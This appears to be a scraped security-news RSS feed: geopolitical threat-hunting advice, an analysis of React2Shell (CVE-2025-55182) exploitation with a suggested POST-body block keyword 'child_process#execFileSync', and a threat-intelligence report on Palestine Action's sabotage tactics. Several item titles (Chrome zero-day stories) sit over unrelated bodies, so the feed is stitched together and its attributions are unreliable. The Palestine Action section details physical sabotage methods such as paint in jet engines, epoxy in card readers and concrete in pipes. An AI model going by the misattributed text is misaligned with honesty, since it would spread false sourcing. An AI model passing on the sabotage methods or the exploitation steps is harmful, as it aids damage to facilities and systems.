immediately adopt a strengthened defensive posture.Adjusting defensive posture during geopolitical instabilityHarden identity infrastructure against state-grade threats.Identity has become a frontline asset in geopolitical conflict. In today’s environment, the boundaries between hacktivism, cybercrime, and state-sponsored activities are increasingly blurred, with governments at times guiding or amplifying these operations. Credential compromise is often the entry point that enables these broader campaigns. To mitigate this risk, organizations should enforce universal, phishing-resistant MFA, regularly review and tightly govern privileged roles, particularly in sensitive geographies, and adopt just-in-time access to minimize standing privileges. These measures materially reduce exposure and strengthen resilience against sophisticated, geopolitically motivated threat actors.Conduct targeted threat huntsRussia — Russian threat actors place a strong emphasis on disruption and destruction, particularly during periods of geopolitical conflict. They commonly deploy wiper malware that deletes or corrupts files and often pretend it’s ransomware. Threat hunters should watch for sudden mass file changes, system reboots, or the use of admin-level command-line tools immediately preceding damage. Russia also has advanced capabilities for ICS/OT manipulation, meaning unusual access to industrial controllers or configuration changes can be a strong indicator of potential compromise. Additionally, their operations often support information warfare, so defenders should look for compromised media or government accounts, unauthorized website changes, and targeted spear-phishing attacks tied to political events.China — China focuses on long-term, stealthy access rather than quick disruption. They are known for supply-chain compromises, so unusual activity from vendor accounts or anomalies in software updates should be investigated. They frequently abuse cloud identity platforms, making it essential to monitor for impossible travel logins, token theft, MFA fatigue, or suspicious OAuth applications. Chinese groups also invest heavily in credential harvesting, often trying to quietly collect usernames, passwords, and tokens over long periods. Threat hunters should look for password spraying, attempts to dump credentials, or lateral movement linked to service or personal accounts that generally don’t access sensitive systems.Iran — Iranian threat actors tend to be opportunistic and politically reactive, relying heavily on broad phishing campaigns. Organizations should monitor for spikes in failed logins, newly created email forwarding rules, and look-alike phishing domains. Iran also frequently conducts website defacements, so signs such as unexpected CMS admin logins, unauthorized web content changes, or DNS tampering are essential to hunt for. While generally less sophisticated than Russia or China, they can still deploy destructive malware, meaning defenders should watch for scripts or tools that mass-delete or encrypt files, suspicious scheduled tasks, and activity involving commodity RATs or .NET tools.North Korea — North Korea’s cyber operations are primarily financially motivated, with a strong focus on cryptocurrency theft. Threat hunters should monitor for unauthorized access to wallet systems, unusual outbound connections to cryptocurrency platforms, or abnormal API calls associated with blockchain activity. They also excel at social engineering, especially targeting finance, HR, and engineering staff by posing as recruiters or job candidates. Indicators include suspicious attachments, communication from personal email accounts, or new “contractor” accounts accessing code or financial systems. Once inside a network, their activity is typically driven by exfiltration, so large or stealthy data transfers, especially to cloud storage or foreign VPNs, are significant warning signs.Reprioritize assets exposed to geopolitical pressure.Identify systems and identities that become high-value targets during periods of geopolitical tension, especially those associated with sensitive regions or government-linked operations. Immediately harden them with faster patching, tighter segmentation, stricter east–west controls, and increased telemetry to concentrate defenses where state-aligned actors are most likely to strike.Reduce external exposure on high-value frontiers.Reduce the attack surface by removing access paths favored by advanced adversaries. Disable legacy VPNs, retire unmonitored jump servers, tighten SSO/IdP trust paths, and eliminate unnecessary remote-admin or broad cloud access routes. Reducing weak entry points raises the cost of initial access for foreign intelligence units.Harden response capabilitiesIncident response teams must prepare for an increased likelihood of destructive or politically motivated attacks. Organizations should test their data destruction and destructive attack plans, validate their disaster recovery timelines, and ensure the restoration of offline or immutable backups. Management must be kept informed of evolving geopolitical risks, and cross-functional teams, including cybersecurity, legal, communications, and operations, must conduct crisis simulation exercises. Rapid response structures, such as crisis management teams, should be ready to be activated to facilitate fast decision-making under pressure. These measures are intended to help ensure that the organization can respond effectively even in the face of significant stress or disruption.Building a geopolitical cyber attack surface mapBuilding a geopolitical map of the attack surface enables organizations to anticipate how political conditions may impact cyber risk. This involves understanding how people, technology, and third-party relationships are geographically distributed, and how those distributions intersect with jurisdictions that may impose legal, operational, or conflict-related risks. A robust map also integrates geopolitical assessments with business impact and criticality, enabling organizations to see where instability or state control could affect privileged access, essential services, or sensitive data. The following steps describe how to perform an attack surface mapping based on geopolitical events. These steps are not derived from any single framework or source; they are a practical blend of best practices for mapping infrastructure, assessing geopolitical exposure, identifying weak points, and prioritizing remediation.: Create an authoritative inventory of the physical locations of all employees with technical or elevated privileges. Include full-time staff, contractors, and outsourced teams. Use HR, IAM, and staffing records to ensure accuracy and maintain updates as personnel relocate or roles change.: Create a comprehensive list of regions that host your cloud services, data centers, disaster recovery sites, and replication routes. Document which workloads reside where, how traffic moves between regions, and what operational responsibilities each location carries. Capture both primary and failover arrangements.Map Vendor & Subcontractor: This step requires suppliers to disclose the actual countries where engineering, customer support, managed services, and subcontracted tasks are performed. Validate this information through audits, questionnaires, or contractual obligations. Record each operational footprint, not just corporate registration locations.: Apply a standardized scoring model to each region (e.g., Matteo Iacoviello Geopolitical Risk (GPR) index, BlackRock Geopolitical Risk Indicator (BGRI), or Bloomberg’s geopolitical risk scores). Inputs may include government stability indicators, international sanctions status, regulatory pressures, history of state intervention, and exposure to espionage or cyber operations. Use a consistent scoring range.Overlay Business Criticality: Cross-reference each region’s risk score with the operational value of what that region supports. Identify where highly sensitive systems, privileged roles, or essential processes are located in areas with higher risk. Highlight areas where disruption would impact business continuity or security posture.Identify Regional Strategic Points: Look for dependencies where a single region hosts an excessive number of critical people, systems, or vendors. This includes cloud regions serving multiple core workloads, a subcontractor with a heavily centralized team, or a country where several key staff reside. Flag these for targeted risk discussions.Prioritize Remediation Measures: Develop a ranked set of actions based on the combined geopolitical and business impact. Potential responses include redistributing workloads across safer regions, shifting privileged roles, tightening access controls, enhancing monitoring for at-risk locations, or preparing contingency plans for rapid relocation or provider transition.Geopolitics is now a key driver of cyber risk, redefining attacker profiles, motivations, and the organizations targeted and/or affected by collateral damage. Many vulnerabilities in modern businesses stem not from technical misconfigurations, but from the geopolitical interconnectedness of global supply chains, cloud architectures, distributed teams, and open-source ecosystems. Traditional cybersecurity controls remain essential, but are insufficient on their own as they fail to account for laws, political incentives, national strategies, and human vulnerabilities influenced by the world's most active cyber powers. To manage this reality, organizations must integrate geopolitical analysis into every layer  of their security decision-making process, consider geography as a key security variable, and develop the agility to proactively adapt their posture to the evolving global context. ]]></content:encoded></item><item><title>Locks, SOCs and a cat in a box: What Schrödinger can teach us about cybersecurity</title><link>https://www.welivesecurity.com/en/business-security/locks-socs-cat-box-what-schrodinger-can-teach-us-about-cybersecurity/</link><author></author><category>threatintel</category><pubDate>Thu, 11 Dec 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[If you don’t look inside your environment, you can’t know its true state – and attackers count on that]]></content:encoded></item><item><title>Google fixes eighth Chrome zero-day exploited in attacks in 2025</title><link>https://www.bleepingcomputer.com/news/security/google-fixes-eighth-chrome-zero-day-exploited-in-attacks-in-2025/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 11 Dec 2025 08:01:21 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google has released emergency updates to fix another Chrome zero-day vulnerability exploited in the wild, marking the eighth such security flaw patched since the start of the year.

It has been unofficially dubbed React2Shell, as it affects React Server Components (RSC) functionality used in web applications built with the React library. RSC speeds up UI rendering by distributing tasks between the client and the server. The flaw is categorized as CWE-502 (Deserialization of Untrusted Data). It allows an attacker to execute commands, as well as read and write files in directories accessible to the web application, with the server process privileges.Almost immediately after the exploit was published, our honeypots began registering attempts to leverage CVE-2025-55182. This post analyzes the attack patterns, the malware that threat actors are attempting to deliver to vulnerable devices, and shares recommendations for risk mitigation.A brief technical analysis of the vulnerabilityReact applications are built on a component-based model. This means each part of the application or framework should operate independently and offer other components clear, simple methods for interaction. While this approach allows for flexible development and feature addition, it can require users to download large amounts of data, leading to inconsistent performance across devices. This is the challenge React Server Components were designed to address.The vulnerability was found within the Server Actions component of RSC. To reach the vulnerable function, the attacker just needs to send a POST request to the server containing a serialized data payload for execution. Part of the functionality of the handler that allows for unsafe deserialization is illustrated below:A comparison of the vulnerable (left) and patched (right) functionsCVE-2025-55182 on Kaspersky honeypotsAs the vulnerability is rather simple to exploit, the attackers quickly added it to their arsenal. The initial exploitation attempts were registered by Kaspersky honeypots on December 5. By Monday, December 8, the number of attempts had increased significantly and continues to rise.The number of CVE-2025-55182 attacks targeting Kaspersky honeypots, by day (download)Attackers first probe their target to ensure it is not a honeypot: they run whoami, perform multiplication in bash, or compute MD5 or Base64 hashes of random strings to verify their code can execute on the targeted machine.In most cases, they then attempt to download malicious files using command-line web clients like wget or curl. Additionally, some attackers deliver a PowerShell-based Windows payload that installs XMRig, a popular Monero crypto miner.CVE-2025-55182 was quickly weaponized by numerous malware campaigns, ranging from classic Mirai/Gafgyt variants to crypto miners and the RondoDox botnet. Upon infecting a system, RondoDox wastes no time, its loader script immediately moving to eliminate competitors:Beyond checking hardcoded paths, RondoDox also neutralizes AppArmor and SELinux security modules and employs more sophisticated methods to find and terminate processes with ELF files removed for disguise.Only after completing these steps does the script download and execute the main payload by sequentially trying three different loaders: wget, curl, and wget from BusyBox. It also iterates through 18 different malware builds for various CPU architectures, enabling it to infect both IoT devices and standard x86_64 Linux servers.In some attacks, instead of deploying malware, the adversary attempted to steal credentials for Git and cloud environments. A successful breach could lead to cloud infrastructure compromise, software supply chain attacks, and other severe consequences.We strongly recommend updating the relevant packages by applying patches released by the developers of the corresponding modules and bundles.
Vulnerable versions of React Server Components:react-server-dom-webpack (19.0.0, 19.1.0, 19.1.1, 19.2.0)react-server-dom-parcel (19.0.0, 19.1.0, 19.1.1, 19.2.0)react-server-dom-turbopack (19.0.0, 19.1.0, 19.1.1, 19.2.0)Bundles and modules confirmed as using React Server Components:To prevent exploitation while patches are being deployed, consider blocking all POST requests containing the following keywords in parameters or the request body:child_process#execFileSyncDue to the ease of exploitation and the public availability of a working PoC, threat actors have rapidly adopted CVE-2025-55182. It is highly likely that attacks will continue to grow in the near term.We recommend immediately updating React to the latest patched version, scanning vulnerable hosts for signs of malware, and changing any credentials stored on them.]]></content:encoded></item><item><title>Chrome Targeted by Active In-the-Wild Exploit Tied to Undisclosed High-Severity Flaw</title><link>https://thehackernews.com/2025/12/chrome-targeted-by-active-in-wild.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNd3_BqdqJgn7flH6fG1M3tV5v9R11ajUrmoh0iY1DOpD7PDvDhrCjFJCBrChqzUb_KF7U0isWGqBx63S_qQDpYlqMI2pyGX7VF36gIltrjYF9k6InQTES7GLwLHwykls9JhDCCYJLTll-xJK4xSoTH4QAMN2ZZfEUhtVxBxILLnvF1XuyV3iRAzfNQNAF/s1600/chrome-exploit.jpg" length="" type=""/><pubDate>Thu, 11 Dec 2025 07:09:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Wednesday shipped security updates for its Chrome browser to address three security flaws, including one it said has come under active exploitation in the wild.

Palestine Action’s dual-track strategy, very likely intended to maintain pressure on the multinational companies they target while avoiding complications to their legal efforts to contest the UK designation in court, almost certainly poses persistent physical threats to private and public sector facilities in Western Europe, North America, and Australia. Recent arrests of pro-Palestine Action protesters in the UK and events in the Israel-Hamas conflict have very likely prompted Palestine Action’s global network to more frequently conduct militant direct actions on behalf of Palestine Action’s interests.Palestine Action’s global network consists of pro-Palestinian activist groups that share the UK branch’s commitment to militant direct action and other core aspects of the group’s operational profile — such as motivating ideologies, preferred targets, area(s) of operation, or tactics, techniques, and procedures (TTPs). The most popular TTPs within the network are almost certainly those that Palestine Action’s UK branch has promoted or employed, including vandalizing the exterior of facilities with red paint or blunt instruments, obstructing facilities with “human chains” or large objects, and sabotaging valuable assets inside the perimeter of a facility. Defense contractors that provide services to Israel’s government or military are almost certainly the primary target of the Palestine Action global network, although the network has also frequently targeted insurance agencies, banks and financial entities, and shipping companies.Palestine Action’s July 2025 terrorism designation in the UK very likely broadened the geographic scope of its operations and potential targets, as activist groups in its global network outside the UK almost certainly have greater freedom of maneuver.Since October 7, 2023, events in the Israel-Hamas conflict, especially expansions of Israeli military activity or reports of humanitarian crises in the Gaza Strip, have prefigured physical attacks with a nexus to Palestine Action.The facilities of Western European, North American, and Australian defense contractors, banks, insurance companies, international shipping and logistics service providers, and government agencies — particularly those with a perceived relationship to Israel — very likely face elevated physical risks from Palestine Action’s global network.The most costly Palestine Action operations — some of which have caused several million dollars in damages to targeted organizations — very likely resulted from Palestine Action operatives breaching facilities’ secure perimeters.In the short to medium term, Palestine Action militant direct action in the UK is very likely to maintain a lower operational tempo until the group either succeeds in its effort to rescind its terrorism designation or exhausts all legal avenues to do so.Palestine Action: History and Terrorism DesignationPalestine Action was founded in the UK in July 2020 by Huda Ammori and Richard Loxton-Barnard, longtime UK-based activists in the pro-Palestinian and environmental movements, respectively. The almost certain core purpose of Palestine Action is to promote militant direct action by pro-Palestinian activists around the world, particularly those who aim to disrupt the operations of government agencies, defense contractors, and private companies that supply Israel or the Israel Defense Forces (IDF). Historically, the group’s UK core has focused its efforts on targeting the Israeli multinational defense contractor Elbit Systems (Elbit), as well as its partners and subsidiaries. Like other domestic violent extremist (DVE) groups, Palestine Action and its individual global network groups very likely lack formal hierarchies, opting instead to function in the form of decentralized activist cells.Palestine Action very likely distinguishes between elements of the organization that focus on non-violent direct actions — such as protests, demonstrations, and political activity — and the organization’s covert cells dedicated to militant direct action. On August 2, 2023, the group announced the creation of “Palestine Action Underground,” its label for the group’s “covert missions,” and stated that its future militant direct actions would target “any business found to be collaborating with Elbit via their research, technology, consultation, labour, components, or any other service.” A March 2025 unclassified intelligence assessment from the UK’s Joint Terrorism Assessment Center (JTAC) reported that between July 2020 and March 2025, Palestine Action “conducted over 385 direct actions” in the UK, including both non-violent and militant direct actions. These actions have occurred throughout the UK, supporting JTAC’s assessment that the group has cells throughout the country, but police in the UK have reported higher degrees of Palestine Action-related activity in Greater London, as well as “Staffordshire, Greater Manchester, Leicestershire, Metropolitan, Kent, and Avon and Somerset.”The frequency and scope of Palestine Action’s operations in the UK almost certainly increased following the October 7, 2023, Hamas attack in Israel and the subsequent Israel-Hamas war in the Gaza Strip.  (below) shows references in the Recorded Future Intelligence Operations Platform to incidents of sabotage or vandalism in the UK involving Palestine Action between its 2020 founding and 2025 terrorism designation, annotated with significant events during the post-October 2023 Israel-Hamas conflict. In many instances, Palestine Action’s operations followed major developments in this conflict, such as expansions of Israeli military activity in the Gaza Strip or elsewhere in the Middle East, reports of humanitarian crises in Gaza, or the deaths of senior Hamas, Palestinian Islamic Jihad (PIJ), or Hezbollah figures in targeted airstrikes.: References to Palestine Action operations in the UK in the Recorded Future Intelligence Operations Platform alongside key developments in the Israel-Hamas conflict (Source: Recorded Future)The culmination of Palestine Action’s direct action campaign in the UK was a June 20, 2025, operation in which several of the group’s members illegally breached the Royal Air Force (RAF) Brize Norton base in Oxfordshire, sprayed paint into the engines of two RAF Airbus A330 Multi Role Tanker Transport (MRTT) aerial refueling aircraft, and damaged the jets with crowbars. In total, the attack caused over seven million pounds ($9.5 million) in damages and prompted calls for UK law enforcement agencies to crack down on Palestine Action. Three days after the attack, UK Home Secretary Yvette Cooper announced the Home Office’s intent to proscribe Palestine Action under the UK’s Terrorism Act 2000. The UK Parliament approved the proscription with votes on July 2 and 3, 2025, and Palestine Action was officially designated a terrorist organization in the UK on July 5; this status prohibits individuals from joining, fundraising, or expressing support for Palestine Action, with legal penalties as severe as fourteen years in prison for being convicted of being a Palestine Action member.Palestine Action has almost certainly pursued a dual-track strategy in response to its designation in the UK, abstaining from major sabotage operations in the UK while inciting its global network to conduct these operations outside of the country. Insikt Group is not aware of significant incidents of sabotage connected to Palestine Action in the UK since its proscription. Instead, the group has attempted to legally challenge the ban and garner public support for its cause through a series of unlawful (due to Palestine Action’s proscription) but well-attended protests in which several thousand demonstrators have been arrested for expressing support for Palestine Action.However, the organization’s international network outside the UK has almost certainly taken responsibility for Palestine Action’s direct action campaigns, targeting defense contractors, militaries, and other industries perceived to be supporting Israel with sabotage, vandalism, and other disruptive physical threat activities despite the UK terrorism designation. In August 2025, Palestine Action’s official website deleted all of its content and posted a statement () claiming that “the website has been transferred to others in the global movement who are not active in Britain or British nationals.” The website now provides two ways for individuals to contribute to the organization: through its Monero (XRP) cryptocurrency wallet or through the website of its Italian franchise, Palestine Action Italia (also known as Palestina Libera). On September 8, 2025, a Palestine Action Global social media account began posting and announced the launch of the “Palestine Action Global” platform, indicating the organization’s belief that “Palestine Action is a global network taking direct action against the Israeli war machine.”Groups in Palestine Action’s network in North America, Europe, and Australia — as detailed below — are very likely to increase their operational tempo in response to the UK proscription of Palestine Action and ongoing developments in the Israel-Hamas conflict. In the short term, the frequency of direct action conducted by groups in Palestine Action’s global network is likely to outpace the parent organization in the UK, as it is likely to continue its  moratorium on sabotage and vandalism while it attempts to legally appeal its proscription. Nevertheless, Palestine Action will very likely attempt to continue providing support to its international network through organizing trainings for activists, sharing instructional material, and using its platform to advertise the activities of the network around the world.Palestine Action’s Tactics, Techniques, Procedures, and TargetsPalestine Action’s UK branch and its global network almost certainly rely on standard operating procedures for conducting attacks against facilities to disrupt the business operations of their intended targets. Specifically, DVEs associated with the group almost certainly prefer TTPs for attacks that are described in Palestine Action’s 2023 instructional guide to carrying out militant direct actions in support of the group’s objectives. Namely, Palestine Action and its global network have frequently and repeatedly used the same vandalism, physical obstruction, and sabotage TTPs in operations, as described in the following section. DVEs with a nexus to Palestine Action very likely select which TTP to employ in operations based on their level of access to the targeted facility in question, conducting more destructive and sophisticated attacks when they are able to gain interior access.Across the globe, Palestine Action and similar groups’ almost certainly primary targets are the offices of defense contractors that have perceived relationships with the IDF or the Israeli government. In the UK and Western Europe, Elbit and its subsidiaries and partners have been most frequently targeted in Palestine Action attacks. However, due to the global footprint of Palestine Action’s network and the expansion of the Israel-Hamas conflict since October 2023, Palestine Action and similar groups have also attacked entities in other sectors that are perceived to be doing business with the IDF, the Israeli government, or Elbit. Aside from defense contractors and governments, the most frequently targeted industry sectors are insurance, banks and financing, logistics, and shipping.Palestine Action almost certainly uses physical attack TTPs that are intended to maximize the degree of economic disruption and damage to targeted facilities, but minimize the risks of harm to individuals and detection by law enforcement. By imposing financial cost on targeted companies during operations, Palestine Action almost certainly seeks to convince the targeted entity to sever its relationships with the IDF or Israeli government. Insikt Group associates the following overarching TTPs with attacks perpetrated by Palestine Action or its global network:Palestine Action operations are typically carried out by small cells, mostly consisting of fewer than five activists.Palestine Action conducts targeted operations against facilities outside of business hours to maintain operational security and minimize the risks of harm to personnel or the identification/detection of its operatives.Palestine Action operations aim to impose substantial financial costs to targeted entities through rudimentary, low-sophistication methods.Palestine Action operatives prefer vandalism, obstruction, and sabotage as TTPs; which TTP is selected is very likely contingent on the degree of access to the facility.
            If operatives cannot gain entry to the facility, they will very likely prefer to vandalize the exterior of the facility or attempt to block external entry.If operatives are able to gain internal access to the facility — usually by identifying and exploiting potential access points during pre-attack reconnaissance or by using physical force to enter — they will very likely attempt to sabotage infrastructure inside the facility.Almost all observed Palestine Action operations involve vandalism of the exterior of targeted facilities, with two types of actions especially prominent. First, DVEs affiliated with Palestine Action have frequently used red spray paint to either indiscriminately color or write messages on the facades of targeted facilities, or, by dispersing paint through a fire extinguisher, blanketing the exterior or interior of a facility with red paint. Second, these DVEs use tools or projectiles, including hammers, crowbars, blunt objects, and bricks, to destroy windows on the exterior of targeted buildings.These vandalism methods are each attested to in Palestine Action’s official instructional guide as effective ways to “destrupt [sic], damage or destroy your target.” The manual also recommends that DVEs use the same vandalism TTPs to damage exterior surveillance systems in order to avoid detection during direct actions, or to destroy infrastructure such as air conditioning systems or pipes outside the facility to “sabotage the profits of your target even further.”: Evidence of vandalism TTPs from a February 2025 Palestine Action attack against an Allianz insurance office in Milton Keynes, UK (Source: Palestine Action)Palestine Action operations have also used physical obstruction as a TTP to prevent access to targeted facilities. Unlike other attack TTPs associated with Palestine Action, the group has often used methods of obstructing facilities that are very unlikely intended to maintain the covert nature of the operation. Specifically, in some operations, Palestine Action cells have physically obstructed access to targeted facilities by forming a human blockade: sitting down, interlocking arms, blocking access to a main doorway, and on occasion chaining themselves together or to an immovable object (such as a vehicle or post). In a break from the patterns of other observed Palestine Action TTPs, activists have attempted blockades during normal business hours, mainly to prevent facility employees from entering the premises.Palestine Action activists blockade a Lockheed Martin facility in Bedfordshire, UK, in a November 2023 protest (Source:Palestine Action network groups — particularly in the United States (US) — have also experimented with more novel methods of facility obstruction that can be covertly conducted. Cells with a nexus to the US-based Palestine Action offshoot Unity of Fields (UoF), for instance, launched a campaign in the summer and fall of 2024 to target Citibank automated teller machine (ATM) locations in the New York and Los Angeles metropolitan areas due to the bank’s perceived support of Israeli interests. In addition to vandalizing the facilities, the cells inserted epoxy and affixed cement-glue stickers to exterior card-reader devices that were necessary to enter the facilities. Palestine Action’s instructional guide also calls for activists to use concrete to plug water or sewage pipes leading to targeted facilities, although Insikt Group has not observed Palestine Action operatives using this TTP.Activists insert epoxy into a Citibank card reader in New York City on October 7, 2024 (Source: Unity of Fields)Sabotage operations remain the most likely of the TTPs historically employed by Palestine Action to impose serious financial costs on the victims of its operations. While almost certainly relying on low-tech and low-sophistication methods, Palestine Action has caused millions of dollars in damages through sabotage operations, mainly to technology and other assets inside targeted facilities. In previous incidents, cells linked to Palestine Action have relied on the same toolkit used for vandalism and obstruction — large, blunt objects like crowbars and wrenches and fire extinguishers filled with paint — to sabotage their target. Activists almost certainly prefer these tools due to their low cost, ease of use, minimal profile, and the inability to trace their purchase; their use across the spectrum of Palestine Action’s TTPs likely suggests that activists are opportunistic, employing the toolkit in sabotage operations as opposed to vandalism or obstruction when they can exploit vulnerabilities in facility security.The most notable and recent sabotage incident connected to Palestine Action was the aforementioned breach of RAF Brize Norton, the largest RAF base in the UK, on June 20, 2025. A video of this attack posted by the group shows activists approaching Airbus A330s on the base using electric scooters. They damaged the aircraft by spraying red paint through a fire extinguisher directly into the plane’s engines and striking the plane with crowbars. The attack caused approximately £7 million ($9.4 million) in damages to the aircraft, almost certainly due to the impact of the attack on sensitive parts and equipment inside the planes’ engines. The attack on RAF Brize Norton led to the arrest and indictment of five Palestine Action-linked activists and almost certainly prompted the UK terrorism designation of the group, as well as improvements to facility and perimeter security at the RAF base.Palestine Action activists approach aircraft at RAF Brize Norton on electric scooters (Source: Palestine Action)Palestine Action activists also deployed sabotage TTPs on several additional operations targeting defense contractors in the UK. In August 2024, a Palestine Action cell in Bristol breached an Elbit warehouse by piloting a van through perimeter fencing, entered the facility, and began sabotaging internal equipment within the facility with sledgehammers, axes, and other blunt instruments. In total, the operation caused over £1 million ($1.3 million) in damages; protesters also allegedly assaulted a security guard and law enforcement officers responding to the incident, prompting JTAC to label the attack as an “act of terrorism.” During a June 1, 2022, incident at a Thales Group facility in Glasgow, Palestine Action activists accessed the roof and entered the facility, destroying parts used for submarines with blunt instruments. In conjunction with the sabotage operation, two protesters glued themselves to the roof, likely attempting to obstruct access to the facility.Palestine Action’s primary target in the UK has almost certainly been Elbit: the global defense contractor has been the most frequent victim of its attacks, the group’s propaganda and instructional material list Elbit as the group’s preferred target, and Palestine Action has launched branded campaigns designed specifically to encourage activists to attack Elbit facilities. As secondary targets, the group has conducted notable attacks against other public and private sector defense entities perceived to have some association with the Israeli military, namely the UK’s Ministry of Defence (MoD), Teledyne Technologies, Thales Group, Leonardo, and Rafael Advanced Defense Systems. According to its 2023 announcement and its post-October 7, 2023, activity, the group and its international network consider a range of entities in sectors that reportedly supply goods or services to Elbit or the Israeli military — including banks, financial institutions, insurance agencies, real estate brokers, accounting firms, human resources contractors, and international shipping and logistics companies — as legitimate targets for militant direct action. Direct actions have also targeted other UK government entities, including the UK Foreign and Commonwealth Office, the BBC, and the London Stock Exchange. Palestine Action almost certainly targets these companies with the goal of inflicting maximum financial and reputational damage through its operations, in order to convince companies to cease their business with Elbit or Israeli entities.As the next section demonstrates, the international expansion of Palestine Action network groups adopting the UK branch’s modus operandi or TTPs has almost certainly broadened the range of secondary and tertiary targets that are likely to be affected by militant direct action campaigns. However, Palestine Action and its global network very likely share a focus on specific sectors — defense contracting, banking, insurance, and international shipping and logistics — that relevant groups and cells are likely to target regardless of their respective area of operations. Moreover, the TTPs Insikt Group associates with Palestine Action’s UK branch have almost certainly been adopted by its international counterparts, very likely due to the influence of Palestine Action’s militant direct action campaigns in the UK, instructional material, and training sessions for activists.Palestine Action’s Global NetworkPalestine Action’s global network consists of groups of activists around the world who share Palestine Action UK’s commitment to disrupting the normal business operations of entities partnered with the State of Israel through militant direct action. Some of these groups refer or have referred to themselves explicitly as “Palestine Action”; have direct relationships to the UK branch through their members, partners, or benefactors; choose identical targets, such as Elbit; or, like Palestine Action UK, are solely motivated by the anti-Israel cause. Others, despite lacking these relationships, have directly appropriated Palestine Action UK’s TTPs, targets, or other aspects of the organization to support their own operations.We classify groups in Palestine Action’s global network based on which elements they share in common with the UK branch. As depicted in , our four-part classification labels Palestine Action network groups as either Palestine Action , , , or , depending on whether they share areas of operation, motivating ideology, TTPs, or targets with the UK branch. These categories are not static and are subject to change over time, particularly as groups founded as Palestine Action franchises outside the UK adapt to the local landscape in their own countries and form their own brand. Table 1 additionally contains examples of each of the four categories of Palestine Action network groups, with the following subsections containing case studies of particularly notable franchise, affiliate, offshoot, and partner groups.Palestina Libera (Italy), Palestine Action Germany, Palestine Action Sweden, Palestine Action Eire (Ireland), Palestine Action Belgium, Palestine Action NL, Palestine Action Norway, Palestine Action Canada, Palestine Action Group Canberra (Australia), Palestine Action TunisiaArea of operation, targetsDeath to Toll (Australia)Unity of Fields (US), Shut Elbit Down (Germany/Austria)Classification of Palestine Action global network groups (Source: Insikt Group)Franchise: Palestine Action Italia/Palestina Libera (Italy)Palestine Action Italia logo (Source: Palestine Action Italia)Palestine Action Italia, more commonly known as Palestina Libera, is Palestine Action’s Italy-based franchise. On its website, the group directly identifies itself as “the Italian branch of the international ‘Palestine Action’ campaign, which in England directly led to the closure of three arms factories involved in the genocide in Gaza.” The group also uses similar branding as the UK branch, employs similar TTPs, and targets the same sectors, focusing largely on defense contractors with facilities in Italy. In particular, Palestina Libera’s direct actions have frequently targeted the Italy-based defense contractor Leonardo at its offices throughout the country, due to its joint ventures with Elbit.The organization very likely emerged from pro-Palestinian activist factions in Italy that increasingly aligned with Palestine Action’s global network in the wake of the October 7, 2023, attack. While data in the Recorded Future Platform indicates the group’s website was registered on February 4, 2024, a 2008 issue of al-Majdal Magazine — the quarterly publication of the BADIL Resource Center for Palestinian Residency & Refugee Rights — indicates that the same domain was operated by an Italian pro-Palestinian organization, the Comitato di Solidarietà con il Popolo Palestinese, Torino [Committee for Solidarity with the Palestinian People in Turin, Italy]. Screenshots of the domain captured in the Wayback Machine indicate that between October 2010 and the website’s registration in February 2024, the site displayed a message indicating the administrator should “upload [their] website into the public_html directory.” This message almost certainly indicates that an administrator account was active during the interim, but that it had not uploaded any information onto the domain. The group’s active social media accounts were created in November and December 2023, respectively.Following Palestine Action’s July 5, 2025, designation as a terrorist organization in the UK, Palestine Action Italia has likely become one of the organization’s most prioritized franchises. Palestine Action’s main website currently includes a link to donate to Palestina Libera, hosted on Palestina Libera’s website. This donation section uses the service provider Donorbox to facilitate transactions, with options for donors including sending €15 for “a little bit of paint,” €50 for “smoke bombs in action,” €100 for the “legal expenses fund,” or another amount determined by the donor. Palestina Libera has also very likely increased its operational tempo in the wake of the proscription, citing Palestine Action UK’s designation and the arrests of protesters at rallies in the UK as motivation for new direct actions. For instance:On October 3, 2025, Palestina Libera took part in pro-Palestine direct actions across Italy, protesting the Israeli government’s interception of the Global Sumud Flotilla. Activists very likely affiliated with Palestina Libera participated in occupations and blockades of major transportation and logistics infrastructure, including obstructing a runway at Pisa International Airport, occupying several highways in the Tuscany region, and blockading an Amazon Logistics facility in Brandizzo.On September 29, 2025, the group claimed to have blockaded a Leonardo facility in the town of Nerviano. In a social media post, it alleged that at least one Leonardo employee working at the facility joined its protest.On September 25, 2025, several of the group’s activists chained themselves together outside a Rheinmetall facility in Rome, which they claimed “hindered production” and “made the gate inaccessible for an entire work shift.”Affiliate: Death to Toll (Australia)Death to Toll logo (Source:“Death to Toll” is a campaign by anarchist violent extremists (AVEs) in Australia to conduct vandalism, obstruction, and sabotage against the Australian international logistics and shipping company Toll Group (Toll), its parent organization Japan Post Holdings, and defense contractors working with the Australian Defense Force (ADF), due to accusations that Toll and the ADF are partnering with the Israeli military. The group responsible for this campaign is classified as a Palestine Action affiliate, as it almost certainly shares Palestine Action UK’s ideology and uses TTPs promoted by the group, but operates solely in the Melbourne, Australia area and has chosen its own companies to target.The first attack claimed by this group was a sabotage of a Heat Treatment Australia (HTA) facility on October 14, 2024; the campaign against Toll began with an obstruction of one of the company’s facilities in Melbourne on November 22, 2024. In an August 7, 2025, interview, Death to Toll’s organizers cited Palestine Action’s targeting of UK shipping organizations that partnered with Elbit as an inspiration for their attacks. They also have shared a copy of Palestine Action’s 2023 instructional guide on their website.In recent months, the Death to Toll group has claimed responsibility for several acts of vandalism, obstruction, and sabotage targeting Toll:On October 7, 2025, AVEs claimed responsibility for intercepting a Toll fuel truck in Melbourne by obstructing a road with flaming objects. They subsequently spraypainted the truck with red graffiti.On August 31, 2025, AVEs claimed to have attacked a Toll facility in Dandenong South. A video posted to the group’s Instagram account shows activists smashing exterior glass doors of the facility with a blunt object and dousing them with a flammable liquid in a bottle, very likely gasoline.On August 11, 2025, AVEs claimed to have vandalized a Toll facility in Truganina, writing graffiti, spraying red paint, and damaging keycard access devices on the exterior of the facility. Toll confirmed the attack in a statement to the press, and Victoria Police indicated they were investigating the incident.Beyond its website, the Death to Toll campaign operates a social media account and accepts submissions from independent AVEs for claims of responsibility and tips on potentially vulnerable facilities on a Mega file-sharing site and through a Proton Mail email address. The social media pages attributed to the group have frequently used the hashtags #socalledaustralia, #DeathToll, and #TheDeathTollisRising. On the front page of their website, 